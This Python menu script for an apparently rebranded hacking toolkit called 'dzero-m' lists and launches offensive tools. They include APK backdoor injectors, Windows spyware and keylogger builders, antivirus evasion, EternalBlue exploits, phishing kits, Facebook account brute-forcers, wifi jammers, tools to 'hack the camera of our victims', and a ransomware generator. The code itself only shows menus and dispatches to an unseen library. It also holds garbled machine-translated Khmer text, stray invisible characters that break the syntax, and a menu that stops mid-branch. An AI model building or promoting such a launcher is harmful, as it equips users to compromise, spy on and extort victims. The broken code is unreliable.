#!/usr/bin/python3
# -*- coding: utf-8 -*-
#Copyright 2021 dzero-m
#Written by: DZERO-M Guillermo
#Facebook: https://facebook.com/DZERO-M
#Github: https://github.com/AdrMXR

BLUE, RED, WHITE, CYAN, DEFAULT, YELLOW, MAGENTA, GREEN, END, BOLD = '\33[94m', '\033[91m', '\33[97m', '\033[36m', '\033[0m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m', '\033[1m'

import sys
import os 
import subprocess
import time
import requests 
import webbrowser
from sys import exit 
from getch import pause  
from tkinter import Tk, filedialog
from lib.banners import *
from lib import kitools
from lib.network import run_network

def check_connection(host='https://www.google.com'):
	print("{}Checking your internet connection...".format(GREEN))
	time.sleep(0.5)
	try:
		req = requests.get(host, timeout=15)
		if req.status_code == 200:
			print("{}Successful internet connection.".format(GREEN))
			time.sleep(0.5)
			pass
	except:
		print("{0}[x]:{1} Check your internet connection.".format(RED, DEFAULT))
		exit(0)

def check_permissions():
	if os.getuid() == 0:
		info()
	else:
		os.system('clear')
		print("{0}[!]{1} ¡Permission denied! Remember to run: {2}sudo {1}python3 dzero-m.py".format(RED, DEFAULT, GREEN))
		exit(0)

def info():
	os.system('clear')
	print("{0}[VERSION]:{1} 1.3.2\n\n".format(RED, DEFAULT))
	time.sleep(0.5)
	print("{0}[AUTOR]:{1} DZERO-M \n\n".format(RED, DEFAULT))
	time.sleep(0.5)
	print("{0}[GITHUB]:{1} https://github.com/DZER0-M\n\n".format(RED, DEFAULT))
	time.sleep(0.5)
	print("{0}[FACEBOOK]:{1} https://www.facebook.com/varoudom.14\n\n".format(RED, DEFAULT))
	time.sleep(0.5)
	print("{0}[INSTAGRAM]:{1} https://www.instagram.com/varoudom\n\n".format(RED, DEFAULT))	
	time.sleep(0.5)
	print("{0}[YOUTUBE]:{1} https://www.youtube.com/channel/UCZmAlv7W82K10mO81CjDuAw\n".format(RED, DEFAULT))
	time.sleep(2.5)
	os.system('clear')

def main():
	print(start_main_menu)
	option = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
	option = option.zfill(2)
	
	if option == '01':
		os.system('clear')
		print ('========={0}Tool{1}==================================={0}Information{1}================================'.format(GREEN, DEFAULT))
		print ('{0}01){1} Backdoor-apk        {2}Add a backdoor to any APK file.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} Evil-Droid          {2}Generate back doors for Android.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} Spade               {2}Python script that generates a backdoor to any APK.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} AhMyth              {2}Android remote administration tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} Andspoilt           {2}Run interactive Android exploits on Linux.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} Kwetza              {2}Inject malware into existing android applications.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} Termux              {2}Linux-based Android Terminal Emulator.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}08){1} Android-Exploits    {2}Collection of Android exploits and hacks.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}09){1} Grabcam             {2}It allows to hack the camera of our victims with a fake page.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}10){1} Androidpatternlock  {2}Get the pattern lock on Android devices.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.BackdoorApk()
		
		elif tool == '02':
			kitools.EvilDroid()
		
		elif tool == '03':
			kitools.Spade()
		
		elif tool == '04':
			kitools.AhMyth()

		elif tool == '05':
			kitools.Andspoilt()

		elif tool == '06':
			kitools.Kwetza()

		elif tool == '07':
			kitools.Termux()

		elif tool == '08':
			kitools.AndroidExploits()

		elif tool == '09':
			kitools.Grabcam()

		elif tool == '10':
			kitools.AndroidPatternLock()
		
		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()	

	elif option == '02':
		os.system('clear')
		print ('========{0}Tool{1}================================================{0}Information{1}==================================='.format(GREEN, DEFAULT))
		print ('{0}01){1} Winpayloads             {2}ម៉ាស៊ីនបង្កើតបន្ទុកដែលមិនអាចរកឃើញនៅក្នុងវីនដូ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} sAINT                   {2}ម៉ាស៊ីនភ្លើង Spyware សម្រាប់ប្រព័ន្ធវីនដូ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} BeeLogger    ​           {2}ជីម៉ែលហ្គេហ្គោឡឺហ្គឺរបង្កើតសម្រាប់វីនដូ.'.format(WHITE, YELLOW, DEFAULT))​​
		print ('{0}04){1} Fake​​I​mageExploiter      {2}ចាក់មេរោគចូលទៅក្នុងរូបភាព jpg សម្រាប់វីនដូ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} Koadic                  {2}ក្រោយការកេងប្រវ័ញ្ច rootkit របស់វីនដូ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} Phantom Evasion         {2}វាប្រហាឧបករណ៍ការពារប្រឆាំងមេរោគ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} Ps1encode               {2}ម៉ាស៊ីនបង្កើតនិងកម្មវិធីបម្លែងកូដដែលមានមូលដ្ឋានលើ PowerShell.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}08){1} DKMC                    {2}ឧបករណ៍គេចវេសពីការផ្ទុកបន្ទុកព្យាបាទ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}09){1} Cromos                  {2}បញ្ចូលកូដទៅក្នុងផ្នែកបន្ថែម Chrome Web ស្របច្បាប់.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}10){1} Eternal_scanner         {2}ម៉ាស៊ីនស្កេនសម្រាប់ការកេងប្រវ័ញ្ចមនោសញ្ចេតនាពណ៌ខៀវនិងអស់កល្បជានិច្ច.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}11){1} EternalblueDoublepulsar {2}ម៉ូឌុល Metasploit ដើម្បីទាញយកភាពងាយរងគ្រោះ Eternalblue-Doublepulsar.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}12){1} EternalBlueWinXPWin10   {2}ម៉ូឌែលដឺមេតាប៉ូឡូអ៊ីតថិនប៊លឌឺចង់បានវីនដូ XP អេសភី ២ សម្រាប់វីនដូ ១០ ប្រូ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}13){1} Windows-Exploits        {2}ការប្រមូលផលវីនដូ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.Winpayloads()

		elif tool == '02':
			kitools.sAINT()

		elif tool == '03':
			kitools.BeeLogger()

		elif tool == '04':
			kitools.FakeImageExploiter()

		elif tool == '05':
			kitools.Koadic()

		elif tool == '06':
			kitools.PhantomEvasion()

		elif tool == '07':
			kitools.Ps1encode()

		elif tool == '08':
			kitools.DKMC()

		elif tool == '09':
			kitools.Cromos()

		elif tool == '10':
			kitools.EternalScanner()
		
		elif tool == '11':
			kitools.EternalblueDoublepulsarMetasploit()

		elif tool == '12':
			kitools.MS17010EternalBlueWinXPWin10()

		elif tool == '13':
			kitools.WindowsExploits()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()			

	elif option == '03':
		os.system('clear')
		print ('======={0}Tool{1}======================================={0}Information{1}====================================='.format(GREEN, DEFAULT))
		print ('{0}01){1} HiddenEye    {2}ឧបករណ៍បន្លំទំនើបជាមួយមុខងារទំនើប.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} PhishX       {2}ការបង្កើតក្លែងបន្លំនិងការបន្លំ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} SocialPhish  {2}ឧបករណ៍បន្លំដែលមាន ៣២ គំរូ + ១ អាចប្ដូរតាមបំណងបាន.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} SocialFish   {2}ឧបករណ៍បន្លំអប់រំ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} PhisherMan   {2}ឧបករណ៍បន្លំដែលមានគំរូចំនួន ១៧ និងមានមុខងារជាមួយង៉ុក.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} Spectre      {2}គាំទ្រការវាយប្រហារតាមអ៊ីនធឺណេតស្ទើរតែគ្រប់គេហទំព័រ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} Blackeye     {2}ឧបករណ៍បន្លំដែលមានគេហទំព័រចំនួន ៣៨ អាចប្រើបាន.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}08){1} PhEmail      {2}ដំណើរការផ្ញើអ៊ីមែលបន្លំដោយស្វ័យប្រវត្តិ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}09){1} Weeman       {2}អ្នកបម្រើ HTTP សម្រាប់ការបន្លំ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}10){1} Zphisher     {2}ឧបករណ៍បន្លំដោយស្វ័យប្រវត្តិ.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}11){1} AIOPhish     {2}ឧបករណ៍បន្លំជាមួយជម្រើសផ្សេងៗគ្នា.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.HiddenEye()

		elif tool == '02':
			kitools.PhishX()

		elif tool == '03':
			kitools.SocialPhish()

		elif tool == '04':
			kitools.SocialFish()

		elif tool == '05':
			kitools.PhisherMan()

		elif tool == '06':
			kitools.Spectre()

		elif tool == '07':
			kitools.Blackeye()

		elif tool == '08':
			kitools.PhEmail()

		elif tool == '09':
			kitools.Weeman()

		elif tool == '10':
			kitools.Zphisher()

		elif tool == '11':
			kitools.AIOPhish()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()	

	elif option == '04':
		os.system('clear')
		print ('======={0}Tool{1}====================================={0}Information{1}======================================'.format(GREEN, DEFAULT))
		print ('{0}01){1} Fluxion        {2}social engineering and network audit tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} Wifiphisher    {2}tool that allows you to capture Wi-Fi passwords through AP.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} Wifibroot      {2}herramienta wifi Pentest Cracking para WPA/WPA2. '.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} Wifite         {2}Run existing wireless audit tools for you.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} Ettercap       {2}Interceptor/sniffer/registrador para LANs con switch.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} Linset         {2}WPA / WPA2 phishing tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} WiFi-Pumpkin   {2}AP framework for easily creating fake networks.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}08){1} Wifresti       {2}Locate your wireless network password on Windows, Linux, and Mac OS.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}09){1} Evil Limiter   {2}Tool that limits the bandwidth of devices.'.format(WHITE, YELLOW, DEFAULT))					
		print ('{0}10){1} Netool-toolkit {2}MitM Pentesting Open Source Toolkit.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}11){1} Dracnmap       {2}Tool used to exploit networks and collect data with nmap.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}12){1} Airgeddon      {2}Bash script to audit wireless networks.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}13){1} Routersploit   {2}It is composed of several modules that help to operate penetration tests.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}14){1} Eaphammer      {2}Kit to carry out targeted attacks against WPA2-Enterprise networks.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}15){1} VMR-MDK        {2}Script to decrypt WPS wireless networks.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}16){1} Wirespy        {2}Allows you to configure quick honeypots to carry out MITMA.'.format(WHITE, YELLOW, DEFAULT))						
		print ('{0}17){1} Wireshark      {2}Network analyzer that allows you to capture and navigate network traffic.'.format(WHITE, YELLOW, DEFAULT))						
		print ('{0}18){1} SniffAir       {2}Framework for wireless pentesting.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}19){1} WifiJammer     {2}Continuously jam all wifi clients / routers.'.format(WHITE, YELLOW, DEFAULT))						
		print ('{0}20){1} KawaiiDeauther {2}Block all wifi clients / routers.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2) 
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.Fluxion()

		elif tool == '02':
			kitools.Wifiphisher()

		elif tool == '03':
			kitools.Wifibroot()

		elif tool == '04':
			kitools.Wifite()

		elif tool == '05':
			kitools.Ettercap()

		elif tool == '06':
			kitools.Linset()

		elif tool == '07':
			kitools.WiFiPumpkin()

		elif tool == '08':
			kitools.Wifresti()

		elif tool == '09':
			kitools.EvilLimiter()

		elif tool == '10':
			kitools.NetoolToolkit()

		elif tool == '11':
			kitools.Dracnmap()

		elif tool == '12':
			kitools.Airgeddon()

		elif tool == '13':
			kitools.Routersploit()

		elif tool == '14':
			kitools.Eaphammer()

		elif tool == '15':
			kitools.VMRMDK()

		elif tool == '16':
			kitools.Wirespy()

		elif tool == '17':
			kitools.Wireshark()

		elif tool == '18':
			kitools.SniffAir()

		elif tool == '19':
			kitools.WifiJammer()

		elif tool == '20':
			kitools.KawaiiDeauther()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()	

	elif option == '05':
		os.system('clear')
		print ('======={0}Tool{1}====================================={0}Information{1}================================'.format(GREEN, DEFAULT))
		print ('{0}01){1} Cupp            {2}Permite crear diccionarios específicamente para una persona.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} Facebooker      {2}Script en perl que realiza fuerza bruta contra Facebook.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} BluForce-FB     {2}Ataques de fuerza bruta en cuentas de Facebook.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} Brut3k1t        {2}Ataques de fuerza bruta contra una multitud de protocolos y servicios.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} SocialBox       {2}Framework de fuerza bruta [Facebook, Gmail, Instagram, Twitter].'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} John The Ripper {2}Programa que aplica fuerza bruta para descifrar contraseñas.'.format(WHITE, YELLOW, DEFAULT))		
		print ('{0}07){1} Hashcat         {2}Herramienta para la recuperación de contraseñas.'.format(WHITE, YELLOW, DEFAULT))		
		print ('{0}08){1} Brutedum        {2}Ataca SSH, FTP, Telnet, PostgreSQL, RDP, VNC con Hydra, Medusa y Ncrack.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}09){1} Facebash        {2}Ataque de fuerza bruta para facebook en shellscript usando TOR.'.format(WHITE, YELLOW, DEFAULT))			
		print ('{0}10){1} Brutespray      {2}Automatiza el escaneo de puertos y realiza ataques por fuerza bruta.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}11){1} Pupi            {2}Pupi es un generador de contraseñas simple a partir de información personal.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}12){1} B4r-brute       {2}Script para crackear cuentas de Facebook usando la ID del usuario.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}13){1} Fb-Hack         {2}Script de recuperación y pirateo de contraseña de Facebook.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.Cupp()

		elif tool == '02':
			kitools.Facebooker()

		elif tool == '03':
			kitools.BluForceFB()

		elif tool == '04':
			kitools.Brut3k1t()

		elif tool == '05':
			kitools.SocialBox()

		elif tool == '06':
			kitools.JohnTheRipper()

		elif tool == '07':
			kitools.Hashcat()

		elif tool == '08':
			kitools.Brutedum()

		elif tool == '09':
			kitools.Facebash()

		elif tool == '10':
			kitools.Brutespray()

		elif tool == '11':
			kitools.Pupi()

		elif tool == '12':
			kitools.B4rbrute()

		elif tool == '13':
			kitools.FbHack()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()	

	elif option == '06':
		os.system('clear')
		print ('======={0}Tool{1}========================================={0}Information{1}========================================'.format(GREEN, DEFAULT))
		print ('{0}01){1} SQLmap       {2}Inyección SQL y toma de control de los servidores de bases de datos.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} XAttacker    {2}Escáner de vulnerabilidades de sitios web.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} Fuxploider   {2}Detecta técnicas favorables para cargar shells web o cualquier archivo malicioso.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} Wordpresscan {2}Escáner de WordPress de vulnerabilidades.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} SiteBroker   {2}Recopila información y automatiza pruebas de penetración en sitios web.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} NoSQLMap     {2}Explotacion de debilidades de configuración predeterminadas en bases de datos NoSQL.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} Sqli-scanner {2}Escanear de sitios web vulnerables a la inyección de SQL destinado a una lista de URL.'.format(WHITE, YELLOW, DEFAULT))		
		print ('{0}08){1} Joomscan     {2}Permite escanear sitios web y detectar configuraciones erroneas o deficiencias.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}09){1} Metagoofil   {2}Extractor de metadatos de documentos públicos (pdf, doc, xls, ppt, etc.).'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}10){1} Sublist3r    {2}Herramienta rápida de enumeración de subdominios para probadores de penetración.'.format(WHITE, YELLOW, DEFAULT))					
		print ('{0}11){1} WAFNinja     {2}Programa que contiene dos funciones para atacar firewalls de aplicaciones web.'.format(WHITE, YELLOW, DEFAULT))					
		print ('{0}12){1} Dirsearch    {2}Diseñada para directorios y archivos de fuerza bruta en sitios web.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}13){1} XSStrike     {2}El escáner XSS más avanzado.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}14){1} LinksF1nd3r  {2}Extractor de componentes web.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}15){1} D-TECT       {2}Herramienta moderna para realizar pentesting en sitios web.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}16){1} Phpsploit    {2}Herramienta capaz de mantener el acceso a un servidor web comprometido.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.SQLmap()

		elif tool == '02':
			kitools.XAttacker()

		elif tool == '03':
			kitools.Fuxploider()

		elif tool == '04':
			kitools.Wordpresscan()

		elif tool == '05':
			kitools.SiteBroker()

		elif tool == '06':
			kitools.NoSQLMap()

		elif tool == '07':
			kitools.SqliScanner()

		elif tool == '08':
			kitools.Joomscan()

		elif tool == '09':
			kitools.Metagoofil()

		elif tool == '10':
			kitools.Sublist3r()

		elif tool == '11':
			kitools.WAFNinja()

		elif tool == '12':
			kitools.Dirsearch()

		elif tool == '13':
			kitools.XSStrike()

		elif tool == '14':
			kitools.LinksF1nd3r()

		elif tool == '15':
			kitools.DTECH()

		elif tool == '16':
			kitools.Phpsploit()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()		

	elif option == '07':
		os.system('clear')
		print ('======={0}Tool{1}====================================={0}Information{1}=================================='.format(GREEN, DEFAULT))
		print ('{0}01){1} SpoofMAC      {2}Permite modificar su direccion MAC para depurar.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} Ip_spoofing   {2}ARP spoofing, HTTP spoofing && Dos.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} Arpspoof      {2}Ataque de falsificación de ARP utilizando sockets del kernel de Linux.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} DerpNSpoof    {2}Herramienta de suplantación de DNS simple.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} DrSpoof       {2}Herramienta para detectar y detener ataques ARP Spoofing en su red local.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} GODKILLER     {2}SMS-BOMBER y SMS-SENDER.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)

		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.SpoofMAC()

		elif tool == '02':
			kitools.IpSpoofing()

		elif tool == '03':
			kitools.Arpspoof()

		elif tool == '04':
			kitools.DerpNSpoof()

		elif tool == '05':
			kitools.DrSpoof()

		elif tool == '06':
			kitools.GODKILLER()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()		

	elif option == '08':
		os.system('clear')
		print ('========={0}Tool{1}========================================{0}Information{1}========================================'.format(GREEN, DEFAULT))
		print ('{0}01){1} NMAP           {2}Obtiene información de los host, puertos y servicios dentro de una red.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} Th3inspector   {2}Herramienta todo en uno para recopilar información.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} FBI            {2}Recopilación de información confidencial en cuentas de Facebook.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} Infoga         {2}Extrae información de cuentas de correo electrónico.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} Crips          {2}Obtiene información sobre direcciones IP, paginas web y registros DNS.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} BillCipher     {2}Recopilación de información para un sitio web o direccion IP.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} RED_HAWK       {2}Herramienta para recopilar información, escanear vulnerabilidades y rastreo.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}08){1} Recon-ng       {2}Herramienta precargada con gran cantidad de modulos para recopilar información.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}09){1} theHarvester   {2}Recopilación de correos electrónicos, nombres, subdominios, direcciones IP y URL.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}10){1} PhoneInfoga    {2}Obtiene información sobre numeros de telefono utilizando recursos gratuitos.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}11){1} Gasmask        {2}Herramienta de recopilación de información todo en uno.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}12){1} URLextractor   {2}Recopilación de información y reconocimiento de sitios web.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}13){1} Devploit       {2}Busqueda de DNS, Whois, IP, GeoIP, subred, puertos, host, etc.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}14){1} ReconDog       {2}Herramienta todo en uno para recopilar información básica.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}15){1} Webkiller      {2}Kit de recopilación de información.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}16){1} Quasar         {2}Framework de recopilación de información.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}17){1} Info-instagram {2}Permite extraer información de cuentas de instagram.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}18){1} UserScan       {2}Scanner de indentidad con el que podras buscar cuentas que tengan un username.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}19){1} XCTR-Hacking   {2}Herramientas todo en uno para la recopilación de información.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}20){1} DeadTrap       {2}Herramienta OSINT para rastrear huellas de un número de teléfono.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.NMAP()

		elif tool == '02':
			kitools.Th3inspector()

		elif tool == '03':
			kitools.FBI()

		elif tool == '04':
			kitools.Infoga()

		elif tool == '05':
			kitools.Crips()

		elif tool == '06':
			kitools.BillCipher()

		elif tool == '07':
			kitools.RedHawk()

		elif tool == '08':
			kitools.ReconNg()
		
		elif tool == '09':
			kitools.theHarvester()

		elif tool == '10':
			kitools.PhoneInfoga()

		elif tool == '11':
			kitools.Gasmask()		

		elif tool == '12':
			kitools.URLextractor()

		elif tool == '13':
			kitools.Devploit()

		elif tool == '14':
			kitools.ReconDog()

		elif tool == '15':
			kitools.Webkiller()

		elif tool == '16':
			kitools.Quasar()

		elif tool == '17':
			kitools.InfoInstagramIphone()

		elif tool == '18':
			kitools.UserScan()

		elif tool == '19':
			kitools.XCTRHackingTools()

		elif tool == '20':
			kitools.DeadTrap()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()			

	elif option == '09':
		os.system('clear')
		print ('======{0}Tool{1}===================================================={0}Information{1}======================================='.format(GREEN, DEFAULT))
		print ('{0}01){1} TheFatRat               {2}Herramienta que compila malware para ejecutar en Linux, Windows, Mac y Android.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} Msfpc                   {2}Contenedor para generar múltiples cargas útiles, según la elección de los usuarios.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} Fcrackzip               {2}Script para descifrar archivos ZIP encriptados por contraseña.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} QRLjacker               {2}Vector de ataque capaz de secuestrar sesiones que dependen de algun codigo QR.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} Lazy                    {2}Script que automatiza muchos procesos de penetracion.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} HTBINVITE               {2}Generador de codigos de invitacion para HackTheBox.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} Ngrok                   {2}Proxy inverso que crea un túnel seguro desde un punto público a un servicio local.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}08){1} Bluepot                 {2}Honeypot Bluetooth escrito en Java.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}09){1} Setoolkit               {2}Marco de prueba de penetración de código abierto diseñado para la ingeniería social.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}10){1} A2sv                    {2}Vulnerabilidad de escaneo automático a SSL.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}11){1} 4nonimizer              {2}Anonimiza la IP pública utilizada para navegar por Internet mediante proveedores VPN.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}12){1} Easysploit              {2}Automatización de Metasploit.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}13){1} NXcrypt                 {2}Inyección de malware en archivos con formato python.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}14){1} KnockMail               {2}Verifica si existe un correo electronico'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}15){1} RkHunter                {2}Herramienta de Unix que detecta los rootkits, puertas traseras y exploits locales.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}16){1} HeraKeylogger           {2}Chrome Keylogger Extension.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}17){1} ZLogger                 {2}Keylogger remoto persistente para Windows y Linux.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}18){1} Xerosploit              {2}Kit de herramientas de pruebas de penetración.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}19){1} Slacksec                {2}Kit basico de herramientas hacking.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}20){1} Katana-Framework        {2}Unifica distintas herramientas funcionales para pruebas de penetración.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}21){1} Z0172CK-Tools           {2}Hacking Tools Z0172CK.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}22){1} Cam-Hack                {2}Método avanzado para piratear la cámara de un móvil o una PC con un enlace.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}23){1} Onex                    {2}Biblioteca de herramientas para hackers.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}24){1} Ransom0                 {2}Ransomware diseñado para buscar y cifrar datos de usuarios.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}25){1} Morpheus                {2}Suite de Man-In-The-Middle que permite a los usuarios manipular tcp/udp.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}26){1} FBTOOL                  {2}Kit de herramientas hacking de facebook'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}27){1} Venom                   {2}Generador/compilador/controlador de shellcode (metasploit).'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
